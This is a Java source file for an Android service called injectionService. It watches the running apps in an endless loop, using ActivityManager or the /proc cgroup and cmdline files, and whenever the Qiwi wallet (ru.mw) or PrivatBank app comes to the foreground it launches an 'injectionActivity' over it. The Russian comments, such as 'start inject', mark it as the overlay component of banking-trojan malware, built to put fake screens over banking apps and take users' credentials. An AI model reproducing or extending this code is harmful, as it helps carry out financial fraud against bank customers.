package com.example.livemusay.myapplication;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.IntentService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class injectionService extends IntentService {

    private static ArrayList<String> mAppsBuffer;
    public injectionService() {
        super("MyIntentService");
    }

    // GET PACKAGES
    public String getPackage()
    {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            ActivityManager am = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
            List<ActivityManager.RunningTaskInfo> taskInfo = am.getRunningTasks(1);
            ComponentName componentInfo = taskInfo.get(0).topActivity;
            return taskInfo.get(0).topActivity.getPackageName();
        }
        else
        {
            ActivityManager manager = (ActivityManager)this.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> tasks = manager.getRunningAppProcesses();
            return tasks.get(0).processName;
        }
    }

    @Override
    protected void onHandleIntent(Intent intent) {scan_act();}


    void scan_act() // стартуем цикл запросов
    {
        if(Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP_MR1)
        {

            String inj_go="";
            for(int i=0;i>-1;i++)
            {


                    String process = getPackage();
                    String massivData_s[] = {"ru.mw","privatbank"}; // Название процессов

                    boolean bool_s = false;
                    for (int ii = 0; ii < massivData_s.length; ii++) {
                        String data_num = massivData_s[ii];
                        data_num = data_num.replace(" ", "");


                        if((data_num!="")&&(data_num!=" ")) {

                            if (process.contains(data_num)) {
                                bool_s = true;
                                inj_go = data_num;
                                break;
                            }
                        }
                    }
                    if (bool_s == true) {
                        Intent dialogIntent = new Intent(injectionService.this, injectionActivity.class)
                                .putExtra("str",inj_go);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(dialogIntent);

                        bool_s=false;
                    }
                }

                try {Thread.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}

        }
        else {//для 5.1 и выше!
            int[] inj_i = new int[5000];
            for (int i = 0; i < inj_i.length; i++)
            {
                inj_i[i]=0;
            }

            for (int i = 0; i > -1; i++) {
                try {
                    TimeUnit.SECONDS.sleep(1);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                    String massivData_s = "/ru.mw/privatbank/";//перечисляем названия процессов через /proc1/proc2/ (Для 6.0)

                try {
                    for (int iii = 0; iii < getRunningAppInLollipopAndMarshmallow(massivData_s).length; iii++) {
                        Log.e("dsf", "" + getRunningAppInLollipopAndMarshmallow(massivData_s)[iii]);
                    }
                }catch (Exception e){Log.e("ERROR","ERROR");}

                    try {Thread.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}

            }
        }
    }

    /////////////////получаем Названия запущенных процессов
    private String[] getRunningAppInLollipopAndMarshmallow(String dataFile) {
        File[] files = new File("/proc").listFiles();
        ArrayList<String> packages = new ArrayList<>();

        if(dataFile.contains("/"))
        {
        for (File file : files) {

            try {

            }catch (Exception e)
            {
                if (!file.isDirectory())
                    continue;
            }

            int pid;
            try {
                pid = Integer.parseInt(file.getName());
            } catch (NumberFormatException e) {
                continue;
            }

            try {
                @SuppressLint("DefaultLocale")
                String cgroup = read(String.format("/proc/%d/cgroup", pid));
                String[] lines = cgroup.split("\n");

                if (lines.length != 2) continue;
                if (!lines[1].endsWith(Integer.toString(pid))) continue;
                if (lines[0].endsWith("bg_non_interactive")) continue;

                @SuppressLint("DefaultLocale")
                String cmdline = read(String.format("/proc/%d/cmdline", pid)).trim();
                Log.i("vvcv",""  +cmdline);
                boolean nextValue = false;

                    String[] massiv = dataFile.split("/");
                    for (int ii=1;ii<massiv.length;ii++) {
                        {
                     //       Log.e("33",massiv[ii]+"-|-"+cmdline);
                            if (cmdline.contains(massiv[ii])) {

                                Intent dialogIntent = new Intent(injectionService.this, injectionActivity.class)
                                        .putExtra("str",massiv[ii]);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(dialogIntent);

                                Log.e("2", "Старт инжект" );
                                break;
                            }}
                    }

                if (nextValue)
                    continue;

                if (cmdline.contains(":"))
                    cmdline = cmdline.split(":")[0].trim();

                packages.add(cmdline);

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        }
        return formatAppsForLollipopAndMarshmallow(packages);
    }

    private String read(String path) throws IOException {
        try {
            StringBuilder output = new StringBuilder();
            BufferedReader reader = new BufferedReader(new FileReader(path));
            output.append(reader.readLine());
            for (String line = reader.readLine(); line != null; line = reader.readLine()) {
                output.append('\n').append(line);
            }
            reader.close();
            return output.toString();
        }catch (Exception ex)
        {
            return "";
        }

    }

    private String[] formatAppsForLollipopAndMarshmallow(ArrayList<String> inputApps) {
        try {
            ArrayList<String> resultRealApps = new ArrayList<>();
            ArrayList<String> withoutRealApps = new ArrayList<>();

            if (mAppsBuffer != null) {
                for (String app : inputApps) {
                    if (!mAppsBuffer.contains(app)) {
                        resultRealApps.add(app);
                    } else {
                        withoutRealApps.add(app);
                    }
                }
                mAppsBuffer = withoutRealApps;
            } else {
                mAppsBuffer = inputApps;
            }

            Set<String> set = new HashSet<>(resultRealApps);
            return (set.size() > 0) ? set.toArray(new String[set.size()]) : new String[]{""};
        }catch (Exception e)
        {
            String[] s={""};
            return s;
        }
    }
}
